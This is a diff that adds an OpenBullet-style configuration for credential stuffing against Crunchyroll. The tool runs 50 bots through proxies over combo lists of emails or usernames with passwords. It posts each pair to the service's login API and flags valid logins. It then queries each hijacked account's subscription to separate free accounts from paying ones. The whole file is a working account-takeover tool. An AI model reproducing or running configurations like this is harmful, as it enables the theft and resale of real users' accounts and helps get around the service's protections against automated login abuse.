@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "crunchyroll",
+  "SuggestedBots": 50,
+  "LastModified": "2020-08-26T14:44:59.732629+02:00",
+  "AdditionalInfo": "",
+  "Author": "cr7ck33r",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token"
+  CONTENT "username=<USER>&password=<PASS>&grant_type=password&scope=offline_access"
+  CONTENTTYPE "application/x-www-form-urlencoded"
+  HEADER "ETP-Anonymous-ID: 61193a7e-3493-4ceb-9f08-5de7b386a30c"
+  HEADER "Authorization: Basic Y3JfYW5kcm9pZDoxY2YzNWRjNS1iMjg2LTQ1NTEtODgzNS1kNGIxYjQyNTg0NDU="
+  HEADER "Host: beta-api.crunchyroll.com"
+  HEADER "Connection: Keep-Alive"
+  HEADER "User-Agent: Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1"
+
+KEYCHECK
+  KEYCHAIN Failure OR
+    KEY "auth.obtain_access_token.invalid_credentials"
+  KEYCHAIN Success OR
+    KEY "{\"access_token\":\""
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "token"
+
+REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me"
+ 
+  HEADER "Host: beta-api.crunchyroll.com"
+  HEADER "Connection: Keep-Alive"
+  HEADER "User-Agent: Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1"
+  HEADER "Authorization: Bearer <token>"
+
+PARSE "<SOURCE>" JSON "external_id" -> VAR "external_id"
+
+REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<external_id>/benefits"
+ 
+  HEADER "Host: beta-api.crunchyroll.com"
+  HEADER "Connection: Keep-Alive"
+  HEADER "User-Agent: Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1"
+  HEADER "Authorization: Bearer <token>"
+
+KEYCHECK
+  KEYCHAIN Custom "FREE" OR
+    KEY "Subscription Not Found"
+  KEYCHAIN Success OR
+    KEY "<SOURCE>" DoesNotContain "Subscription Not Found"
